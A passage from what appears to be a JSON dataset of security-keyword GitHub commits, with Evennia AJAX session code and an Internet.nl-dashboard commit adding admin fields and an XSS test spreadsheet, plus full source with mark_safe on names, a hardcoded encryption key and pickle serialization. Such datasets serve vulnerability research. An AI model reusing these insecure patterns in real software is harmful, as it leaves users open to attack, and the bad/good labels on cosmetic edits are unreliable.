= self.databuffer.get(csessid, [])\n        if dataentries:\n            return dataentries.pop(0)\n        request.notifyFinish().addErrback(self._responseFailed, csessid, request)\n        if csessid in self.requests:\n            self.requests[csessid].finish()  # Clear any stale request.\n        self.requests[csessid] = request\n        return server.NOT_DONE_YET\n\n    def mode_close(self, request):\n        \"\"\"\n        This is called by render_POST when the client is signalling\n        that it is about to be closed.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        csessid = request.args.get('csessid')[0]\n        try:\n            sess = self.sessionhandler.sessions_from_csessid(csessid)[0]\n            sess.sessionhandler.disconnect(sess)\n        except IndexError:\n            self.client_disconnect(csessid)\n        return '\"\"'\n\n    def render_POST(self, request):\n        \"\"\"\n        This function is what Twisted calls with POST requests coming\n        in from the ajax client. The requests should be tagged with\n        different modes depending on what needs to be done, such as\n        initializing or sending/receving data through the request. It\n        uses a long-polling mechanism to avoid sending data unless\n        there is actual data available.\n\n        Args:\n            request (Request): Incoming request.\n\n        \"\"\"\n        dmode = request.args.get('mode', [None])[0]\n        if dmode == 'init':\n            # startup. Setup the server.\n            return self.mode_init(request)\n        elif dmode == 'input':\n            # input from the client to the server\n            return self.mode_input(request)\n        elif dmode == 'receive':\n            # the client is waiting to receive data.\n            return self.mode_receive(request)\n        elif dmode == 'close':\n            # the client is closing\n            return self.mode_close(request)\n        elif dmode == 'keepalive':\n            # A reply to our keepalive request - all is well\n            return self.mode_keepalive(request)\n        else:\n            # This should not happen if client sends valid data.\n            return '\"\"'\n\n\n#\n# A session type handling communication over the\n# web client interface.\n#\n\nclass AjaxWebClientSession(session.Session):\n    \"\"\"\n    This represents a session running in an AjaxWebclient.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        self.protocol_key = \"webclient/ajax\"\n        super(AjaxWebClientSession, self).__init__(*args, **kwargs)\n\n    def get_client_session(self):\n        \"\"\"\n        Get the Client browser session (used for auto-login based on browser session)\n\n        Returns:\n            csession (ClientSession): This is a django-specific internal representation\n                of the browser session.\n\n        \"\"\"\n        if self.csessid:\n            return _CLIENT_SESSIONS(session_key=self.csessid)\n\n    def disconnect(self, reason=\"Server disconnected.\"):\n        \"\"\"\n        Disconnect from server.\n\n        Args:\n            reason (str): Motivation for the disconnect.\n        \"\"\"\n        csession = self.get_client_session()\n\n        if csession:\n            csession[\"webclient_authenticated_uid\"] = None\n            csession.save()\n            self.logged_in = False\n        self.client.lineSend(self.csessid, [\"connection_close\", [reason], {}])\n        self.client.client_disconnect(self.csessid)\n        self.sessionhandler.disconnect(self)\n\n    def at_login(self):\n        csession = self.get_client_session()\n        if csession:\n            csession[\"webclient_authenticated_uid\"] = self.uid\n            csession.save()\n\n    def data_out(self, **kwargs):\n        \"\"\"\n        Data Evennia -> User\n\n        Kwargs:\n            kwargs (any): Options to the protocol\n        \"\"\"\n        self.sessionhandler.data_out(self, **kwargs)\n\n    def send_text(self, *args, **kwargs):\n        \"\"\"\n        Send text data. This will pre-process the text for\n        color-replacement, conversion to html etc.\n\n        Args:\n            text (str): Text to send.\n\n        Kwargs:\n            options (dict): Options-dict with the following keys understood:\n                - raw (bool): No parsing at all (leave ansi-to-html markers unparsed).\n                - nocolor (bool): Remove all color.\n                - screenreader (bool): Use Screenreader mode.\n                - send_prompt (bool): Send a prompt with parsed html\n\n        \"\"\"\n        if args:\n            args = list(args)\n            text = args[0]\n            if text is None:\n                return\n        else:\n            return\n\n        flags = self.protocol_flags\n        text = utils.to_str(text, force_string=True)\n\n        options = kwargs.pop(\"options\", {})\n        raw = options.get(\"raw\", flags.get(\"RAW\", False))\n        xterm256 = options.get(\"xterm256\", flags.get('XTERM256', True))\n        useansi = options.get(\"ansi\", flags.get('ANSI', True))\n        nocolor = options.get(\"nocolor\", flags.get(\"NOCOLOR\") or not (xterm256 or useansi))\n        screenreader = options.get(\"screenreader\", flags.get(\"SCREENREADER\", False))\n        prompt = options.get(\"send_prompt\", False)\n\n        if screenreader:\n            # screenreader mode cleans up output\n            text = parse_ansi(text, strip_ansi=True, xterm256=False, mxp=False)\n            text = _RE_SCREENREADER_REGEX.sub(\"\", text)\n        cmd = \"prompt\" if prompt else \"text\"\n        if raw:\n            args[0] = text\n        else:\n            args[0] = parse_html(text, strip_ansi=nocolor)\n\n        # send to client on required form [cmdname, args, kwargs]\n        self.client.lineSend(self.csessid, [cmd, args, kwargs])\n\n    def send_prompt(self, *args, **kwargs):\n        kwargs[\"options\"].update({\"send_prompt\": True})\n        self.send_text(*args, **kwargs)\n\n    def send_default(self, cmdname, *args, **kwargs):\n        \"\"\"\n        Data Evennia -> User.\n\n        Args:\n            cmdname (str): The first argument will always be the oob cmd name.\n            *args (any): Remaining args will be arguments for `cmd`.\n\n        Kwargs:\n            options (dict): These are ignored for oob commands. Use command\n                arguments (which can hold dicts) to send instructions to the\n                client instead.\n\n        \"\"\"\n        if not cmdname == \"options\":\n            # print \"ajax.send_default\", cmdname, args, kwargs\n            self.client.lineSend(self.csessid, [cmdname, args, kwargs])\n"
                }
            },
            "msg": "Escape AJAX session input to better protect against XSS attacks. Resolve #1846"
        }
    },
    "https://github.com/internetstandards/Internet.nl-dashboard": {
        "9c1c17e55e436e0f6a5f7271c39d77d8a6890738": {
            "url": "https://api.github.com/repos/internetstandards/Internet.nl-dashboard/commits/9c1c17e55e436e0f6a5f7271c39d77d8a6890738",
            "html_url": "https://github.com/internetstandards/Internet.nl-dashboard/commit/9c1c17e55e436e0f6a5f7271c39d77d8a6890738",
            "message": "Add spreadsheet with XSS attacks, icon to dashboard and status to upload in admin",
            "sha": "9c1c17e55e436e0f6a5f7271c39d77d8a6890738",
            "keyword": "XSS attack",
            "diff": "diff --git a/dashboard/internet_nl_dashboard/admin.py b/dashboard/internet_nl_dashboard/admin.py\nindex 2f7ceb2..36d6c23 100644\n--- a/dashboard/internet_nl_dashboard/admin.py\n+++ b/dashboard/internet_nl_dashboard/admin.py\n@@ -216,8 +216,8 @@ class UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n \n @admin.register(UploadLog)\n class UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n-    list_display = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n-    search_fields = ('internal_filename', 'orginal_filename', 'message')\n+    list_display = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')\n+    search_fields = ('internal_filename', 'orginal_filename', 'status')\n     list_filter = ['message', 'upload_date', 'user'][::-1]\n \n-    fields = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n+    fields = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')\ndiff --git a/dashboard/settings.py b/dashboard/settings.py\nindex e84878f..949ad5b 100644\n--- a/dashboard/settings.py\n+++ b/dashboard/settings.py\n@@ -219,13 +219,13 @@\n \n JET_SIDE_MENU_ITEMS = [\n \n-    {'label': _('\ud83d\udd27 Configuration'), 'items': [\n+    {'label': _('\ud83c\udf9b\ufe0f Configuration'), 'items': [\n         {'name': 'auth.user'},\n         {'name': 'auth.group'},\n         {'name': 'constance.config', 'label': _('Configuration')},\n     ]},\n \n-    {'label': _('Dashboard'), 'items': [\n+    {'label': _('\ud83d\udcca Dashboard'), 'items': [\n         {'name': 'internet_nl_dashboard.account'},\n         {'name': 'internet_nl_dashboard.urllist'},\n         {'name': 'internet_nl_dashboard.uploadlog'},\ndiff --git a/tests/test spreadsheet uploads/xss.ods b/tests/test spreadsheet uploads/xss.ods\nnew file mode 100644\nindex 0000000..8a5b7d4\nBinary files /dev/null and b/tests/test spreadsheet uploads/xss.ods differ\n",
            "files": {
                "/dashboard/internet_nl_dashboard/admin.py": {
                    "changes": [
                        {
                            "diff": "\n \n @admin.register(UploadLog)\n class UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n-    list_display = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n-    search_fields = ('internal_filename', 'orginal_filename', 'message')\n+    list_display = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')\n+    search_fields = ('internal_filename', 'orginal_filename', 'status')\n     list_filter = ['message', 'upload_date', 'user'][::-1]\n \n-    fields = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n+    fields = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')",
                            "add": 3,
                            "remove": 3,
                            "filename": "/dashboard/internet_nl_dashboard/admin.py",
                            "badparts": [
                                "    list_display = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')",
                                "    search_fields = ('internal_filename', 'orginal_filename', 'message')",
                                "    fields = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')"
                            ],
                            "goodparts": [
                                "    list_display = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')",
                                "    search_fields = ('internal_filename', 'orginal_filename', 'status')",
                                "    fields = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')"
                            ]
                        }
                    ],
                    "source": "\nfrom datetime import datetime, timedelta import pytz from constance.admin import Config, ConstanceAdmin, ConstanceForm from cryptography.fernet import Fernet from django.conf import settings from django.contrib import admin from django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin from django.contrib.auth.admin import UserAdmin as BaseUserAdmin from django.contrib.auth.models import Group, User from django.contrib.humanize.templatetags.humanize import naturaltime from django.utils.safestring import mark_safe from django_celery_beat.admin import PeriodicTaskAdmin, PeriodicTaskForm from django_celery_beat.models import CrontabSchedule, PeriodicTask from import_export import resources from import_export.admin import ImportExportModelAdmin from dashboard.internet_nl_dashboard.models import Account, DashboardUser, UploadLog, UrlList class MyPeriodicTaskForm(PeriodicTaskForm): fieldsets=PeriodicTaskAdmin.fieldsets \"\"\" Interval schedule does not support due_ or something. Which is absolutely terrible and vague. I can't understand why there is not an is_due() for each type of schedule. This makes it very hazy when something will run. Because of this, we'll move to the horrifically designed absolute nightmare format Crontab. Crontab would be half-great if the parameters where named. Get your crontab guru going, this is the only way you'll understand what you're doing. https://crontab.guru/ \"\"\" def clean(self): print('cleaning') cleaned_data=super(PeriodicTaskForm, self).clean() return cleaned_data class IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin): list_display=('name_safe', 'enabled', 'interval', 'crontab', 'next', 'due', 'precise', 'last_run_at', 'queue', 'task', 'args', 'last_run', 'runs') list_filter=('enabled', 'queue', 'crontab') search_fields=('name', 'queue', 'args') form=MyPeriodicTaskForm save_as=True @staticmethod def name_safe(obj): return mark_safe(obj.name) @staticmethod def last_run(obj): return obj.last_run_at @staticmethod def runs(obj): return obj.total_run_count @staticmethod def due(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now(pytz.utc)) date=datetime.now(pytz.utc) +timedelta(seconds=y) return naturaltime(date) @staticmethod def precise(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: return obj.schedule.remaining_estimate(last_run_at=datetime.now(pytz.utc)) @staticmethod def next(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now(pytz.utc)) date=datetime.now(pytz.utc) +timedelta(seconds=y) return date class Meta: ordering=[\"-name\"] class IECrontabSchedule(ImportExportModelAdmin): pass admin.site.unregister(PeriodicTask) admin.site.unregister(CrontabSchedule) admin.site.register(PeriodicTask, IEPeriodicTaskAdmin) admin.site.register(CrontabSchedule, IECrontabSchedule) class DashboardUserInline(admin.StackedInline): model=DashboardUser can_delete=False verbose_name_plural='Dashboard Users' class UserResource(resources.ModelResource): class Meta: model=User class GroupResource(resources.ModelResource): class Meta: model=Group class UserAdmin(BaseUserAdmin, ImportExportModelAdmin): resource_class=UserResource inlines=(DashboardUserInline,) list_display=('username', 'first_name', 'last_name', 'email', 'is_active', 'is_staff', 'is_superuser', 'last_login', 'in_groups') actions=[] @staticmethod def in_groups(obj): value=\"\" for group in obj.groups.all(): value +=group.name return value class GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin): resource_class=GroupResource admin.site.unregister(User) admin.site.register(User, UserAdmin) admin.site.unregister(Group) admin.site.register(Group, GroupAdmin) class CustomConfigForm(ConstanceForm): def __init__(self, *args, **kwargs): super(CustomConfigForm, self).__init__(*args, **kwargs) class ConfigAdmin(ConstanceAdmin): change_list_form=CustomConfigForm change_list_template='admin/config/settings.html' admin.site.unregister([Config]) admin.site.register([Config], ConfigAdmin) @admin.register(Account) class AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('name', 'enable_logins', 'internet_nl_api_username') search_fields=('name',) list_filter=['enable_logins'][::-1] fields=('name', 'enable_logins', 'internet_nl_api_username', 'internet_nl_api_password') def save_model(self, request, obj, form, change): if 'internet_nl_api_password' in form.changed_data: f=Fernet(settings.FIELD_ENCRYPTION_KEY) encrypted=f.encrypt(obj.internet_nl_api_password.encode()) obj.internet_nl_api_password=encrypted super().save_model(request, obj, form, change) actions=[] @admin.register(UrlList) class UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('name', 'account',) search_fields=('name', 'account__name') list_filter=['account'][::-1] fields=('name', 'account', 'urls') @admin.register(UploadLog) class UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize') search_fields=('internal_filename', 'orginal_filename', 'message') list_filter=['message', 'upload_date', 'user'][::-1] fields=('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize') ",
                    "sourceWithComments": "from datetime import datetime, timedelta\n\nimport pytz\nfrom constance.admin import Config, ConstanceAdmin, ConstanceForm\nfrom cryptography.fernet import Fernet\nfrom django.conf import settings\nfrom django.contrib import admin\nfrom django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin\nfrom django.contrib.auth.admin import UserAdmin as BaseUserAdmin\nfrom django.contrib.auth.models import Group, User\nfrom django.contrib.humanize.templatetags.humanize import naturaltime\nfrom django.utils.safestring import mark_safe\nfrom django_celery_beat.admin import PeriodicTaskAdmin, PeriodicTaskForm\nfrom django_celery_beat.models import CrontabSchedule, PeriodicTask\nfrom import_export import resources\nfrom import_export.admin import ImportExportModelAdmin\n\nfrom dashboard.internet_nl_dashboard.models import Account, DashboardUser, UploadLog, UrlList\n\n\nclass MyPeriodicTaskForm(PeriodicTaskForm):\n\n    fieldsets = PeriodicTaskAdmin.fieldsets\n\n    \"\"\"\n    Interval schedule does not support due_ or something. Which is absolutely terrible and vague.\n    I can't understand why there is not an is_due() for each type of schedule. This makes it very hazy\n    when something will run.\n\n    Because of this, we'll move to the horrifically designed absolute nightmare format Crontab.\n    Crontab would be half-great if the parameters where named.\n\n    Get your crontab guru going, this is the only way you'll understand what you're doing.\n    https://crontab.guru/#0_21_*_*_*\n    \"\"\"\n\n    def clean(self):\n        print('cleaning')\n\n        cleaned_data = super(PeriodicTaskForm, self).clean()\n\n        # if not self.cleaned_data['last_run_at']:\n        #     self.cleaned_data['last_run_at'] = datetime.now(pytz.utc)\n\n        return cleaned_data\n\n\nclass IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin):\n    # most / all time schedule functions in celery beat are moot. So the code below likely makes no sense.\n\n    list_display = ('name_safe', 'enabled', 'interval', 'crontab', 'next',  'due',\n                    'precise', 'last_run_at', 'queue', 'task', 'args', 'last_run', 'runs')\n\n    list_filter = ('enabled', 'queue', 'crontab')\n\n    search_fields = ('name', 'queue', 'args')\n\n    form = MyPeriodicTaskForm\n\n    save_as = True\n\n    @staticmethod\n    def name_safe(obj):\n        return mark_safe(obj.name)\n\n    @staticmethod\n    def last_run(obj):\n        return obj.last_run_at\n\n    @staticmethod\n    def runs(obj):\n        # print(dir(obj))\n        return obj.total_run_count\n\n    @staticmethod\n    def due(obj):\n        if obj.last_run_at:\n            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)\n        else:\n            # y in seconds\n            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))\n            date = datetime.now(pytz.utc) + timedelta(seconds=y)\n\n            return naturaltime(date)\n\n    @staticmethod\n    def precise(obj):\n        if obj.last_run_at:\n            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)\n        else:\n            return obj.schedule.remaining_estimate(last_run_at=datetime.now(pytz.utc))\n\n    @staticmethod\n    def next(obj):\n        if obj.last_run_at:\n            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)\n        else:\n            # y in seconds\n            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))\n            # somehow the cron jobs still give the correct countdown even last_run_at is not set.\n\n            date = datetime.now(pytz.utc) + timedelta(seconds=y)\n\n            return date\n\n    class Meta:\n        ordering = [\"-name\"]\n\n\nclass IECrontabSchedule(ImportExportModelAdmin):\n    pass\n\n\nadmin.site.unregister(PeriodicTask)\nadmin.site.unregister(CrontabSchedule)\nadmin.site.register(PeriodicTask, IEPeriodicTaskAdmin)\nadmin.site.register(CrontabSchedule, IECrontabSchedule)\n\n\nclass DashboardUserInline(admin.StackedInline):\n    model = DashboardUser\n    can_delete = False\n    verbose_name_plural = 'Dashboard Users'\n\n\n# Thank you:\n# https://stackoverflow.com/questions/47941038/how-should-i-add-django-import-export-on-the-user-model?rq=1\nclass UserResource(resources.ModelResource):\n    class Meta:\n        model = User\n        # fields = ('first_name', 'last_name', 'email')\n\n\nclass GroupResource(resources.ModelResource):\n    class Meta:\n        model = Group\n\n\nclass UserAdmin(BaseUserAdmin, ImportExportModelAdmin):\n    resource_class = UserResource\n    inlines = (DashboardUserInline, )\n\n    list_display = ('username', 'first_name', 'last_name',\n                    'email', 'is_active', 'is_staff', 'is_superuser', 'last_login', 'in_groups')\n\n    actions = []\n\n    @staticmethod\n    def in_groups(obj):\n        value = \"\"\n        for group in obj.groups.all():\n            value += group.name\n        return value\n\n\n# I don't know if the permissions between two systems have the same numbers... Only one way to find out :)\nclass GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin):\n    resource_class = GroupResource\n\n\nadmin.site.unregister(User)\nadmin.site.register(User, UserAdmin)\nadmin.site.unregister(Group)\nadmin.site.register(Group, GroupAdmin)\n\n\n# todo: make sure this is implemented.\n# Overwrite the ugly Constance forms with something nicer\nclass CustomConfigForm(ConstanceForm):\n    def __init__(self, *args, **kwargs):\n        super(CustomConfigForm, self).__init__(*args, **kwargs)\n        # ... do stuff to make your settings form nice ...\n\n\nclass ConfigAdmin(ConstanceAdmin):\n    change_list_form = CustomConfigForm\n    change_list_template = 'admin/config/settings.html'\n\n\nadmin.site.unregister([Config])\nadmin.site.register([Config], ConfigAdmin)\n\n\n@admin.register(Account)\nclass AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n\n    list_display = ('name', 'enable_logins', 'internet_nl_api_username')\n    search_fields = ('name', )\n    list_filter = ['enable_logins'][::-1]\n    fields = ('name', 'enable_logins', 'internet_nl_api_username', 'internet_nl_api_password')\n\n    def save_model(self, request, obj, form, change):\n\n        # If the internet_nl_api_password changed, encrypt the new value.\n        # Example usage and docs: https://github.com/pyca/cryptography\n        if 'internet_nl_api_password' in form.changed_data:\n            f = Fernet(settings.FIELD_ENCRYPTION_KEY)\n            encrypted = f.encrypt(obj.internet_nl_api_password.encode())\n            obj.internet_nl_api_password = encrypted\n\n            # You can decrypt using f.decrypt(token)\n\n        super().save_model(request, obj, form, change)\n\n    actions = []\n\n\n@admin.register(UrlList)\nclass UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n\n    list_display = ('name', 'account', )\n    search_fields = ('name', 'account__name')\n    list_filter = ['account'][::-1]\n    fields = ('name', 'account', 'urls')\n\n\n@admin.register(UploadLog)\nclass UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin):\n    list_display = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n    search_fields = ('internal_filename', 'orginal_filename', 'message')\n    list_filter = ['message', 'upload_date', 'user'][::-1]\n\n    fields = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')\n"
                },
                "/dashboard/settings.py": {
                    "changes": [
                        {
                            "diff": "\n \n JET_SIDE_MENU_ITEMS = [\n \n-    {'label': _('\ud83d\udd27 Configuration'), 'items': [\n+    {'label': _('\ud83c\udf9b\ufe0f Configuration'), 'items': [\n         {'name': 'auth.user'},\n         {'name': 'auth.group'},\n         {'name': 'constance.config', 'label': _('Configuration')},\n     ]},\n \n-    {'label': _('Dashboard'), 'items': [\n+    {'label': _('\ud83d\udcca Dashboard'), 'items': [\n         {'name': 'internet_nl_dashboard.account'},\n         {'name': 'internet_nl_dashboard.urllist'},\n         {'name': 'internet_nl_dashboard.uploadlog'}",
                            "add": 2,
                            "remove": 2,
                            "filename": "/dashboard/settings.py",
                            "badparts": [
                                "    {'label': _('\ud83d\udd27 Configuration'), 'items': [",
                                "    {'label': _('Dashboard'), 'items': ["
                            ],
                            "goodparts": [
                                "    {'label': _('\ud83c\udf9b\ufe0f Configuration'), 'items': [",
                                "    {'label': _('\ud83d\udcca Dashboard'), 'items': ["
                            ]
                        }
                    ],
                    "source": "\n\"\"\" Django settings for dashboard project. Generated by 'django-admin startproject' using Django 2.1.7. For more information on this file, see https://docs.djangoproject.com/en/2.1/topics/settings/ For the full list of settings and their values, see https://docs.djangoproject.com/en/2.1/ref/settings/ \"\"\" import os from datetime import timedelta from django.utils.translation import gettext_lazy as _ BASE_DIR=os.path.dirname(os.path.abspath(__file__)) SETTINGS_PATH=os.path.normpath(os.path.dirname(__file__)) SECRET_KEY='_dzlo^9d DEBUG=True ALLOWED_HOSTS=[] INSTALLED_APPS=[ 'constance', 'constance.backends.database', 'jet.dashboard', 'jet', 'import_export', 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'django.contrib.humanize', 'django_celery_beat', 'compressor', 'websecmap.app', 'websecmap.organizations', 'websecmap.scanners', 'websecmap.reporting', 'websecmap.map', 'websecmap.pro', 'dashboard.internet_nl_dashboard', 'django_otp', 'django_otp.plugins.otp_static', 'django_otp.plugins.otp_totp', 'two_factor', ] try: if not os.environ.get('COMPRESS', False): import django_uwsgi INSTALLED_APPS +=['django_uwsgi',] except ImportError: pass MIDDLEWARE=[ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.locale.LocaleMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', 'django_otp.middleware.OTPMiddleware', ] ROOT_URLCONF='dashboard.urls' TEMPLATES=[ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS':[ BASE_DIR +'/', ], 'APP_DIRS': True, 'OPTIONS':{ 'context_processors':[ 'constance.context_processors.config', 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, }, ] WSGI_APPLICATION='dashboard.wsgi.application' DATABASE_OPTIONS={ 'mysql':{'init_command': \"SET character_set_connection=utf8,\" \"collation_connection=utf8_unicode_ci,\" \"sql_mode='STRICT_ALL_TABLES';\"}, } DB_ENGINE=os.environ.get('DB_ENGINE', 'mysql') DATABASE_ENGINES={ 'mysql': 'dashboard.app.backends.mysql', } DATABASES_SETTINGS={ 'dev':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'test':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'production':{ 'ENGINE': DATABASE_ENGINES.get(DB_ENGINE, 'django.db.backends.' +DB_ENGINE), 'NAME': os.environ.get('DB_NAME', 'dashboard'), 'USER': os.environ.get('DB_USER', 'dashboard'), 'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'), 'HOST': os.environ.get('DB_HOST', 'mysql'), 'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'),{}) } } DATABASE=os.environ.get('DJANGO_DATABASE', 'dev') DATABASES={'default': DATABASES_SETTINGS[DATABASE]} AUTH_PASSWORD_VALIDATORS=[ { 'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator', }, { 'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator', }, { 'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator', }, { 'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator', }, ] LANGUAGE_CODE='en-us' TIME_ZONE='UTC' USE_I18N=True USE_L10N=True USE_TZ=True LOCALE_PATHS=['locale'] LANGUAGE_COOKIE_NAME='dashboard_language' STATIC_URL='/static/' if DEBUG: STATIC_ROOT='static' else: STATIC_ROOT='/srv/dashboard/static/' JET_SIDE_MENU_ITEMS=[ {'label': _('\ud83d\udd27 Configuration'), 'items':[ {'name': 'auth.user'}, {'name': 'auth.group'}, {'name': 'constance.config', 'label': _('Configuration')}, ]}, {'label': _('Dashboard'), 'items':[ {'name': 'internet_nl_dashboard.account'}, {'name': 'internet_nl_dashboard.urllist'}, {'name': 'internet_nl_dashboard.uploadlog'}, ]}, {'label': _('\ud83d\udd52 Periodic Tasks'), 'items':[ {'name': 'app.job'}, {'name': 'django_celery_beat.periodictask'}, {'name': 'django_celery_beat.crontabschedule'}, ]}, ] MEDIA_ROOT=os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) +'/uploads/') UPLOAD_ROOT=os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) +'/uploads/') LOGIN_URL=\"two_factor:login\" LOGIN_REDIRECT_URL=\"/dashboard/\" LOGOUT_REDIRECT_URL=LOGIN_URL TWO_FACTOR_QR_FACTORY='qrcode.image.pil.PilImage' TWO_FACTOR_TOTP_DIGITS=6 TWO_FACTOR_PATCH_ADMIN=True FIELD_ENCRYPTION_KEY=os.environ.get('FIELD_ENCRYPTION_KEY', b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=') if not DEBUG and FIELD_ENCRYPTION_KEY==b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=': raise ValueError('FIELD_ENCRYPTION_KEY has to be configured on the OS level, and needs to be different than the ' 'default key provided. Please create a new key. Instructions are listed here:' 'https://github.com/pyca/cryptography. In short, run: key=Fernet.generate_key()') LOGGING={ 'version': 1, 'disable_existing_loggers': False, 'handlers':{ 'console':{ 'class': 'logging.StreamHandler', 'formatter': 'color', }, }, 'formatters':{ 'debug':{ 'format': '%(asctime)s\\t%(levelname)-8s -%(filename)-20s:%(lineno)-4s -' '%(funcName)20s() -%(message)s', }, 'color':{ '()': 'colorlog.ColoredFormatter', 'format': '%(log_color)s%(asctime)s\\t%(levelname)-8s -' '%(message)s', 'datefmt': '%Y-%m-%d %H:%M', 'log_colors':{ 'DEBUG': 'green', 'INFO': 'white', 'WARNING': 'yellow', 'ERROR': 'red', 'CRITICAL': 'bold_red', }, } }, 'loggers':{ 'django':{ 'handlers':['console'], 'level': os.getenv('DJANGO_LOG_LEVEL', 'INFO'), }, 'dashboard':{ 'handlers':['console'], 'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'), }, }, } CELERY_accept_content=['pickle', 'yaml'] CELERY_task_serializer='pickle' CELERY_result_serializer='pickle' CELERY_BROKER_URL=os.environ.get('BROKER', 'redis://localhost:6379/0') ENABLE_UTC=True CELERY_ACCEPT_CONTENT=['pickle'] CELERY_TASK_SERIALIZER='pickle' CELERY_RESULT_SERIALIZER='pickle' CELERY_TIMEZONE='UTC' CELERY_BEAT_SCHEDULER='django_celery_beat.schedulers:DatabaseScheduler' CELERY_BROKER_CONNECTION_MAX_RETRIES=1 CELERY_BROKER_CONNECTION_RETRY=False CELERY_RESULT_EXPIRES=timedelta(hours=4) CELERY_WORKER_PREFETCH_MULTIPLIER=2 CELERY_WORKER_CONCURRENCY=10 CELERY_ACKS_LATE=True TOOLS={ 'organizations':{ 'import_data_dir': '', }, } OUTPUT_DIR=os.environ.get('OUTPUT_DIR', os.path.abspath(os.path.dirname(__file__)) +'/') VENDOR_DIR=os.environ.get('VENDOR_DIR', os.path.abspath(os.path.dirname(__file__) +'/../vendor/') +'/') if DEBUG: DATA_UPLOAD_MAX_NUMBER_FIELDS=10000 STATICFILES_FINDERS=( 'django.contrib.staticfiles.finders.FileSystemFinder', 'django.contrib.staticfiles.finders.AppDirectoriesFinder', 'compressor.finders.CompressorFinder', ) COMPRESS_CSS_FILTERS=['compressor.filters.cssmin.CSSCompressorFilter'] COMPRESS_STORAGE=( 'compressor.storage.GzipCompressorFileStorage' ) COMPRESS_OFFLINE=not DEBUG ",
